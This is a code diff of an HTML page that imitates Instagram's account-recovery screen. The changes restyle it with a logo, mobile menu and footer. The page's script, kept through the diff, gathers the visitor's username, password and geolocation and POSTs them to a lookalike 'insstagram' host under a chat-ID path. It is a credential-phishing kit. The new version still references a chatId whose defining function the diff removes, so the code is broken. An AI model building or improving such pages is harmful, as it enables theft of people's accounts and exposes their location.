@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/x-icon" href="favicon.ico">
     <title>Instagram</title>
     <style>
         body {
@@ -21,27 +20,54 @@
             width: 100%;
             padding: 10px 20px;
             display: flex;
-            justify-content: flex-end;
+            justify-content: space-between;
             align-items: center;
-            background-color: #1c1c1c;
+            background-color: black;
             position: absolute;
             top: 0;
         }
-        .navbar button {
+        .navbar img {
+            height: 40px;
+        }
+        .nav-buttons {
+            display: flex;
+            align-items: center;
+        }
+        .nav-buttons button {
             background-color: #0095f6;
             color: white;
             border: none;
-            padding: 8px 16px;
+            padding: 6px 12px;
             border-radius: 5px;
             cursor: pointer;
             font-size: 14px;
-            margin-right: 10px;
+            margin-left: 10px;
         }
-        .navbar a {
+        .nav-buttons a {
             color: #0095f6;
             text-decoration: none;
             font-weight: bold;
             font-size: 14px;
+            margin-left: 10px;
+        }
+        .toggle-menu {
+            display: none;
+            flex-direction: column;
+            background: black;
+            position: absolute;
+            top: 50px;
+            right: 10px;
+            border-radius: 5px;
+            padding: 10px;
+        }
+        .toggle-menu button {
+            margin: 5px 0;
+        }
+        .toggle-btn {
+            display: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
         }
         .container {
             background: #1c1c1c;
@@ -49,7 +75,7 @@
             border-radius: 10px;
             text-align: center;
             width: 300px;
-            margin-top: 50px;
+            margin-top: 60px;
         }
         input {
             width: 100%;
@@ -58,6 +84,8 @@
             border: none;
             border-radius: 5px;
             outline: none;
+            background-color: #333;
+            color: white;
         }
         .hidden {
             display: none;
@@ -67,83 +95,101 @@
             padding: 12px;
             border: none;
             border-radius: 5px;
-            background-color: #0095f6;
+            background-color: #00376b;
             color: white;
             font-size: 16px;
             cursor: pointer;
         }
         button:disabled {
             background-color: #555;
+            cursor: not-allowed;
         }
-	#mm {
-	    width: 200px;
-	}   
-
+        .login-help {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            color: #aaa;
+            font-size: 12px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                width: 90%;
+            }
+            .toggle-btn {
+                display: block;
+            }
+            .nav-buttons {
+                display: none;
+            }
+            .toggle-menu.active {
+                display: flex;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="navbar">
-        <button id="mm">Log In</button>
-        <a href="#">Sign Up</a>
+        <img src="./Instagram_Logo.png" alt="Instagram Logo">
+        <div class="nav-buttons">
+            <button>Log In</button>
+            <a href="#">Sign Up</a>
+        </div>
+        <span class="toggle-btn" onclick="toggleMenu()">☰</span>
+        <div class="toggle-menu" id="toggleMenu">
+            <button onclick="toggleMenu()">Log In</button>
+            <a href="#" onclick="toggleMenu()">Sign Up</a>
+            <button onclick="toggleMenu()">✖</button>
+        </div>
     </div>
     <div class="container">
-        <h2>Trouble Logging In?</h2>
+        <h2>Trouble logging in?</h2>
         <p>Enter your email, phone, or username and we'll send you a link to get back into your account.</p>
         <input type="text" id="username" placeholder="Email, Phone, or Username" oninput="showPasswordInput()">
         <input type="password" id="password" placeholder="Password" class="hidden">
-        <button id="login-btn" disabled>login</button>
+        <button id="login-btn" disabled>Send login link</button>
+        <p class="login-help">Can't reset your password?</p>
     </div>
+    <div class="footer">&copy; 2025 Instagram</div>
     <script>
-    function getChatIdFromURL() {
-        const pathSegments = window.location.pathname.split("/");
-        return pathSegments[1] || null;
-    }
+        function showPasswordInput() {
+            let usernameInput = document.getElementById("username");
+            let passwordInput = document.getElementById("password");
+            let loginBtn = document.getElementById("login-btn");
 
-    function showPasswordInput() {
-        let usernameInput = document.getElementById("username");
-        let passwordInput = document.getElementById("password");
-        let loginBtn = document.getElementById("login-btn");
-
-        if (usernameInput.value.trim() !== "") {
-            passwordInput.classList.remove("hidden");
-            loginBtn.disabled = false;
-        } else {
-            passwordInput.classList.add("hidden");
-            loginBtn.disabled = true;
-        }
-    }
-
-    function getLocation(callback) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                position => callback(position.coords.latitude, position.coords.longitude),
-                error => {
-                    console.warn("⚠️ Location access denied or unavailable.");
-                    callback(null, null);
-                }
-            );
-        } else {
-            console.warn("⚠️ Geolocation is not supported.");
-            callback(null, null);
-        }
-    }
-
-    document.getElementById("login-btn").addEventListener("click", function () {
-        let username = document.getElementById("username").value.trim();
-        let password = document.getElementById("password").value.trim();
-        let chatId = getChatIdFromURL();
-
-        if (!chatId) {
-            alert("❌ Chat ID is missing in the URL.");
-            return;
+            if (usernameInput.value.trim() !== "") {
+                passwordInput.classList.remove("hidden");
+                loginBtn.disabled = false;
+            } else {
+                passwordInput.classList.add("hidden");
+                loginBtn.disabled = true;
+            }
         }
 
-        if (!username || !password) {
-            alert("❌ Please enter both username and password.");
-            return;
+        function getLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => callback(position.coords.latitude, position.coords.longitude),
+                    () => callback(null, null)
+                );
+            } else {
+                callback(null, null);
+            }
         }
 
-        getLocation((latitude, longitude) => {
+        document.getElementById("login-btn").addEventListener("click", function () {
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            if (!username || !password) {
+                alert("Please enter both username and password");
+                return;
+            }
+
+            getLocation((latitude, longitude) => {
             fetch(`https://insstagram-4pwg.onrender.com/${chatId}/sendMessage`, { // Dynamic URL
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -158,8 +204,8 @@
                 console.error("❌ Error:", error);
                 alert("❌ Failed to log in. Please try again.");
             });
+            });
         });
-    });
-</script>
+    </script>
 </body>
 </html>
